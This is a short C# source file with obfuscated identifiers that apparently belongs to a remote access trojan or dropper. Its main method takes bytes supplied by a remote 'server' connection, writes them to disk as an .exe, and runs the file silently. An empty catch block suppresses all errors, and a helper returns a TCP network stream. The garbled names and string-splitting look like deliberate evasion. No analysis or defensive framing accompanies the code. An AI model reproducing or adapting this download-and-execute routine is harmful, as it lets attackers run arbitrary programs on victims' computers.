using System.Diagnostics;
using System.IO;
using System.Net.Sockets;

namespace irvrmjavhica;

internal class OREDMR
{
	public MROIDM server;

	public OREDMR(MROIDM lID)
	{
		server = lID;
	}

	public void irvrmjavhicaremyove_user()
	{
		try
		{
			byte[] bytes = server.irvrmjavhicapuyll_data();
			string text = DAEONIF.irvrmjavhicaget_mtath() + DAEONIF.irvrmjavhicaremvUwer + ".exe|irvrmjavhica".Split(new char[1] { '|' })[0];
			if (!File.Exists(text))
			{
				File.WriteAllBytes(text, bytes);
				Process.Start(text);
			}
		}
		catch
		{
		}
	}

	public NetworkStream irvrmjavhicaNS(TcpClient irvrmjavhicatcpthsck)
	{
		return irvrmjavhicatcpthsck.GetStream();
	}
}
